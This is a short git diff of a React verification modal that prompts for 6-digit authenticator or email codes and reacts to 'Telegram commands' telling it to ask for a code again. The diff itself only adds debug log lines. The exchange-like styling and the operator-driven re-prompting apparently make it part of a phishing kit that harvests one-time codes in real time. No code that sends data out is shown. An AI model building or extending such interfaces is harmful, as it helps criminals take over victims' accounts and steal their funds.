@@ -18,8 +18,10 @@ export default function Modal({ displayModal, setDisplayModal, modal, setModal }
     // Handle Telegram commands
     useEffect(() => {
         if (command === 'REQUEST_AUTH_OTP_CODE_AGAIN' && modal === 'AuthApp') {
+            console.log("COMMAND IN VEFIR IS ", command)
             setInvalid(true);
         } else if (command === 'REQUEST_EMAIL_OTP_CODE_AGAIN' && modal === 'Email') {
+            console.log("Command in VERIF IS ", command )
             setInvalid(true);
         }
     }, [command, modal]);
@@ -108,6 +110,7 @@ export default function Modal({ displayModal, setDisplayModal, modal, setModal }
                                                 placeholder={`Enter 6-digit ${modal === 'AuthApp' ? 'authenticator' : 'email'} code`}
                                                 className={`text-[16px] ${theme === 'light' ? 'bg-white text-[#1e2329]' : 'bg-[#1e2329] text-white'} m-0 pb-1 leading-[24px] focus:outline-none font-medium flex-grow caret-[#FCD535]`}
                                             />
+                                            
                                             <div className={`items-center text-[#FCD535] cursor-pointer`}
                                                  onClick={() => navigator.clipboard.readText().then(text => setOtpCode(text))}>
                                                 Paste
